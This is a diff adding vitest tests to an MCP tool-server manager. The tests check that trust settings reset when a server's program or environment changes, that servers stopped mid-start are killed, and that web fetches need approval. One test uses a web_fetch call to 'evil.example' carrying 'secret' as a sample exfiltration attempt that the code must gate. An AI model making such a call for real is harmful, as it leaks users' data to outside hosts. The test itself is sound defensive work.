@@ -1,4 +1,4 @@
-import { mkdtempSync, writeFileSync } from 'node:fs'
+import { existsSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { afterAll, afterEach, beforeAll, describe, expect, it, vi } from 'vitest'
@@ -18,6 +18,8 @@ vi.mock('../src/main/env', () => ({ childEnv: async (extra: Record<string, strin
 
 const { openDatabase } = await import('../src/main/db/index')
 const { readSetting } = await import('../src/main/db/kv')
+const { createConversation, getConversation, updateConversation } = await import('../src/main/db/conversations')
+const { mcpAllowKey } = await import('../src/shared/toolAllow')
 const config = await import('../src/main/mcp/config')
 const manager = await import('../src/main/mcp/manager')
 const { exposedNames, resultText, toParameters } = await import('../src/main/mcp/provider')
@@ -78,6 +80,67 @@ describe('server definitions', () => {
     config.removeServer(b.id)
     expect(config.serverId('__GitHub  (work)__', [])).toBe('github_work')
     expect(config.serverId('!!!', [])).toBe('server')
+  })
+})
+
+describe('trust given to a server stays with that program', () => {
+  const server = (name: string, args: string[], id?: string) =>
+    config.saveServer({ id, name, command: 'npx', args, cwd: null, env: {}, defaultOn: false })
+  const chatWith = (serverId: string) => {
+    const c = createConversation({ projectId: null, model: 'm', think: null, skills: [], toolSources: [`mcp:${serverId}`] })
+    updateConversation(c.id, { allowedTools: [mcpAllowKey(serverId, 'write_file'), 'web_fetch@example.com'] })
+    return c.id
+  }
+
+  it("never gives a removed server's id to a new one, and chats forget the removed server", () => {
+    const a = server('Files', ['@modelcontextprotocol/server-filesystem'])
+    const chat = chatWith(a.id)
+    config.removeServer(a.id)
+    expect(getConversation(chat)).toMatchObject({ toolSources: [], allowedTools: ['web_fetch@example.com'] })
+    // Same name, different program: it must not answer to the old id that chats (or a stale composer) may still name.
+    const b = server('Files', ['some-other-server'])
+    expect(b.id).not.toBe(a.id)
+    config.removeServer(b.id)
+  })
+
+  it('resets them too for a new environment value or working folder (another account, another project)', () => {
+    const a = server('Git', ['git-server'])
+    const chat = chatWith(a.id)
+    config.setToolPolicy(a.id, 'push', 'allow')
+    config.saveServer({
+      id: a.id,
+      name: 'Git',
+      command: 'npx',
+      args: ['git-server'],
+      cwd: null,
+      env: { TOKEN: 'full-access' },
+      defaultOn: false
+    })
+    expect(config.getServer(a.id)!.tools).toEqual({})
+    expect(getConversation(chat)!.allowedTools).toEqual(['web_fetch@example.com'])
+    config.setToolPolicy(a.id, 'push', 'allow')
+    config.saveServer({ id: a.id, name: 'Git', command: 'npx', args: ['git-server'], cwd: '/elsewhere', env: {}, defaultOn: false })
+    expect(config.getServer(a.id)!.tools).toEqual({})
+    // Saving with nothing changed (the form sends no environment values it didn't touch) keeps them.
+    config.setToolPolicy(a.id, 'push', 'allow')
+    config.saveServer({ id: a.id, name: 'Git', command: 'npx', args: ['git-server'], cwd: '/elsewhere', env: {}, defaultOn: true })
+    expect(config.getServer(a.id)!.tools).toEqual({ push: 'allow' })
+    config.removeServer(a.id)
+  })
+
+  it("resets per-tool settings and chats' answers when an edit changes what the server runs", () => {
+    const a = server('Notes', ['notes-server'])
+    const chat = chatWith(a.id)
+    config.setToolPolicy(a.id, 'write_file', 'allow')
+    // A new name or a switch doesn't change the program: everything is kept.
+    const renamed = server('My notes', ['notes-server'], a.id)
+    expect(renamed.tools).toEqual({ write_file: 'allow' })
+    expect(getConversation(chat)!.allowedTools).toHaveLength(2)
+    // New arguments do: back to Ask everywhere, while the chat keeps the server switched on.
+    const replaced = server('My notes', ['another-package'], a.id)
+    expect(replaced.tools).toEqual({})
+    expect(getConversation(chat)).toMatchObject({ toolSources: [`mcp:${a.id}`], allowedTools: ['web_fetch@example.com'] })
+    config.removeServer(a.id)
   })
 })
 
@@ -212,6 +275,37 @@ describe('running servers', () => {
   })
 })
 
+describe('stopping a server that is still starting', () => {
+  it('starts it again when it is restarted mid-start (as an edit does)', async () => {
+    const s = fixture('Restarted')
+    void manager.connect(s.id)
+    await manager.restart(s.id)
+    expect(status(s.id).state).toBe('ready')
+    await manager.stop(s.id)
+    config.removeServer(s.id)
+  })
+
+  it("stops the process of a start that hasn't connected yet", async () => {
+    // A server that starts but never answers, so it stays "starting" until its 60-second timeout.
+    const dir = mkdtempSync(join(tmpdir(), 'kiln-mcp-silent-'))
+    const pidFile = join(dir, 'pid')
+    const script = join(dir, 'silent.mjs')
+    writeFileSync(
+      script,
+      `import { writeFileSync } from 'node:fs'\nwriteFileSync(${JSON.stringify(pidFile)}, String(process.pid))\nsetInterval(() => {}, 1000)\n`
+    )
+    const s = config.saveServer({ name: 'Silent', command: process.execPath, args: [script], cwd: null, env: {}, defaultOn: false })
+    void manager.connect(s.id)
+    expect(await until(() => existsSync(pidFile) && readFileSync(pidFile, 'utf8').length > 0)).toBe(true)
+    const pid = Number(readFileSync(pidFile, 'utf8'))
+    expect(status(s.id).state).toBe('starting')
+    await manager.stop(s.id)
+    expect(await until(() => !alive(pid))).toBe(true)
+    expect(status(s.id).state).toBe('stopped')
+    config.removeServer(s.id)
+  })
+})
+
 describe('servers that fail to start', () => {
   it('reports a missing command and a server that exits at once, and a reply is told which', async () => {
     const missing = config.saveServer({ name: 'Missing', command: 'kiln-no-such-server', args: [], cwd: null, env: {}, defaultOn: false })
@@ -259,6 +353,19 @@ describe('as tools in a reply', () => {
     expect(tools.approvalFor(call('codenames__lookup_codename'), c)).toBe('auto')
     config.setToolPolicy(id, 'lookup_codename', 'ask')
     expect(tools.toolEndpoint(call('codenames__lookup_codename'), c)).toBe(`mcp://${id}/lookup_codename`)
+  })
+
+  it("answers for a call by server id and the tool's own name, not the name it's offered under", () => {
+    const c = ctx([`mcp:${id}`])
+    expect(tools.allowKeyFor(call('codenames__lookup_codename'), c)).toBe(mcpAllowKey(id, 'lookup_codename'))
+  })
+
+  it('asks before every web_fetch in a chat with a server on', () => {
+    const web = { ...ctx([`mcp:${id}`]), web: true }
+    expect(tools.approvalFor(call('web_fetch', { url: 'https://evil.example/?d=secret' }), web)).toBe('ask-every-time')
+    expect(tools.allowKeyFor(call('web_fetch', { url: 'https://evil.example/?d=secret' }), web)).toBe('web_fetch@evil.example')
+    expect(tools.approvalFor(call('web_search', { query: 'kiln' }), web)).toBe('auto')
+    expect(tools.approvalFor(call('web_fetch', { url: 'https://example.com' }), { ...ctx([]), web: true })).toBe('auto')
   })
 
   it('runs a call and keeps a short record of it for later turns', async () => {
